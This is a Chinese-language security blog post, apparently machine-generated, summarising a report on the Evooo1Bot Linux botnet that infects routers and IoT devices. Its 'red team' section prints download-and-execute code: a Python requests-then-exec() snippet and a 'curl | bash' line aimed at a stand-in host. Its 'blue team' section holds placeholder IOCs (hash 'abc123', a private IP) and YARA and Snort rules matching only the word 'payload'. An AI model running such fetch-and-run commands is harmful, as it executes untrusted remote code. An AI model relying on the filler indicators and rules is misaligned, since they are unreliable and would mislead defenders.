---
layout: post
title:  "New Evooo1Bot Linux botnet turns routers into traffic relay nodes"
date:   2026-08-15 18:17:30 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Evooo1Bot：一種基於 Mirai 的模組化 Linux 僵屍網絡
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `SSH Brute-forcing`, `DDoS`, `SOCKS5 Relay`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Evooo1Bot 僵屍網絡利用已知的漏洞，例如 Alcatel、NETGEAR、Tenda、Mitsubishi Electric、Telesquare 和 D-Link 裝置上的弱點，來感染 Linux 系統。這些漏洞允許攻擊者遠程執行任意代碼。
* **攻擊流程圖解**:
  1. 攻擊者掃描網路，尋找具有已知漏洞的目標裝置。
  2. 攻擊者利用漏洞，遠程執行任意代碼，下載並執行 Evooo1Bot 僵屍網絡的 payload。
  3. payload 清除 Bash 歷史記錄，以消除攻擊痕跡。
* **受影響元件**: 各種 Linux 系統，尤其是那些具有已知漏洞的 IoT 裝置。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要知道目標裝置的 IP 地址和已知漏洞。
* **Payload 建構邏輯**:

    ```
    
    python
      import requests
    
      # 下載 payload
      payload_url = "http://example.com/payload"
      response = requests.get(payload_url)
      payload = response.content
    
      # 執行 payload
      exec(payload)
    
    ```
  *範例指令*: 使用 `curl` 下載 payload，然後使用 `bash` 執行。

```

bash
  curl -s http://example.com/payload | bash

```
* **繞過技術**: Evooo1Bot 僵屍網絡使用加密的 C2 通信和 SSH brute-forcing 來繞過安全措施。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `abc123` | `192.168.1.100` | `example.com` | `/tmp/payload` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule Evooo1Bot {
        meta:
          description = "Evooo1Bot 僵屍網絡"
          author = "Your Name"
        strings:
          $a = "payload" ascii
        condition:
          $a
      }
    
    ```
  或者使用 Snort/Suricata Signature：

```

snort
  alert tcp any any -> any any (msg:"Evooo1Bot 僵屍網絡"; content:"payload"; sid:1000001;)

```
* **緩解措施**: 更新系統和應用程式，使用強密碼，限制遠程存取，並監控系統日誌。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **SOCKS5 Relay**: 一種代理伺服器，允許攻擊者將流量轉發到其他伺服器或網站。
* **SSH Brute-forcing**: 一種攻擊技術，使用自動化工具嘗試猜測 SSH 密碼。
* **DDoS (Distributed Denial of Service)**: 一種攻擊技術，使用多個來源發送大量流量到目標系統，導致系統過載。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/new-evooo1bot-linux-botnet-turns-routers-into-traffic-relay-nodes/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


